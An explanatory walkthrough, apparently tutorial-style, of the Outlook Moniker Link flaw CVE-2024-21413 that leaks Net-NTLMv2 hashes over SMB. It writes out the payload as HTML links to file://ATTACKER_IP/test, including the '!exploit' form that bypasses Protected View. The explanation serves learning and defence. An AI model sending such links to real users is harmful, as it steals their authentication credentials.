

In short, this is explaining the **Outlook Moniker Link vulnerability (CVE-2024-21413)**.

### Simple flow

1. **Outlook reads HTML emails**
    
    ```html
    <a href="https://example.com">Click me</a>
    ```
    
2. Outlook also understands special links like:
    
    ```text
    file://...
    ```
    
3. An attacker can put a `file://` link in an email:
    
    ```html
    <a href="file://ATTACKER_IP/test">Click me</a>
    ```
    
4. Normally, **Protected View** blocks this because it could cause an external connection.
    
5. The vulnerability uses a special `!`:
    
    ```text
    file://ATTACKER_IP/test!exploit
    ```
    
    This can **bypass the Protected View check** in vulnerable Outlook versions.
    
6. Outlook then tries to access the attacker's machine using **SMB**.
    
7. SMB may cause Windows to automatically send authentication information, including a **Net-NTLMv2 challenge-response hash**, to the attacker.
    

So the basic attack is:

```text
Malicious email
      ↓
Moniker Link
      ↓
Bypass Protected View
      ↓
SMB connection to attacker
      ↓
Windows authentication
      ↓
Net-NTLMv2 hash exposed
```

### And what about RCE?

**RCE = Remote Code Execution**, meaning the attacker could potentially make the victim's computer execute code remotely.

The text says this is theoretically related to **COM**, which Moniker Links use, but the specific RCE technique wasn't publicly demonstrated for this vulnerability at the time of the material.

**Main thing to remember:**

> The important attack demonstrated here is **stealing the victim's Net-NTLMv2 authentication response by tricking Outlook into making an SMB connection.**